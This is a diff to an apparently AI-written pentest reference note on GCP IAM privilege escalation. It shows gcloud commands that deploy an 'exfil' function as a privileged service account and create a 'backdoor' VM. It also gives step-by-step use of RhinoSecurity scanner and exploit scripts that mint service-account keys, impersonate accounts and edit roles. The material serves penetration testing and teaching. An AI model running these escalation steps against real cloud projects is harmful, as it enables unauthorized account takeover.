@@ -162,7 +162,7 @@ gcloud projects add-iam-policy-binding <project-id> \
 # --- 4. Update Cloud Function code (cloudfunctions.functions.update + iam.serviceAccounts.actAs) ---
 # Deploy a new function that runs as a privileged SA
 gcloud functions deploy exfil \
-  --runtime python39 \
+  --runtime python312 \
   --trigger-http \
   --service-account=<privileged-sa-email> \
   --entry-point=main \
@@ -189,18 +189,25 @@ gcloud compute instances create backdoor \
 
 ## RhinoSecurity Scripts
 
+The repo has two parts: **`PrivEscScanner/`** (find paths) and **`ExploitScripts/`** (one script per abusable permission, named after that permission).
+
 ```bash
-cd GCP-IAM-Privilege-Escalation/PrivEscScripts/
+# 1. Enumerate the effective permissions of every member in the project(s)
+python3 PrivEscScanner/enumerate_member_permissions.py -p <project-id>
+#    → writes all_org_privesc_scan_results.json (or similar)
 
-# Check all possible privesc paths for current user
-python3 PrivEscScan.py
+# 2. Analyse those results for known privilege-escalation paths
+python3 PrivEscScanner/check_for_privesc.py
+#    → prints which members can escalate and via which permission
 
-# Automated exploitation of specific paths
-python3 CreateServiceAccountKey.py --project <project> --account <sa-email>
-python3 AddRoleToServiceAccount.py --project <project> --account <sa-email>
-
-# Check permissions across all projects
-python3 EnumerateAllPermissions.py
+# 3. Run the matching ExploitScript — named by the permission it abuses, e.g.:
+python3 ExploitScripts/iam.serviceAccountKeys.create.py       # mint an SA key
+python3 ExploitScripts/iam.serviceAccounts.getAccessToken.py  # generateAccessToken impersonation
+python3 ExploitScripts/iam.roles.update.py                    # add perms to a custom role you can edit
+python3 ExploitScripts/deploymentmanager.deployments.create.py# deploy as the DM SA (Editor by default)
+python3 ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py
+python3 ExploitScripts/compute.instances.create.py            # create a VM with a privileged SA attached
+# ls ExploitScripts/ for the full permission→script list
 ```
 
 ---
@@ -227,6 +234,10 @@ curl -H "Metadata-Flavor: Google" \
 
 ---
 
+> [!note] **See also** — GCP misconfiguration auditing (the enumeration counterpart) is [[Tools/Cloud/ScoutSuite|ScoutSuite]]; RhinoSec's AWS framework is [[Tools/Cloud/Pacu|Pacu]] (no GCP equivalent exists, hence the gcloud-first approach here).
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
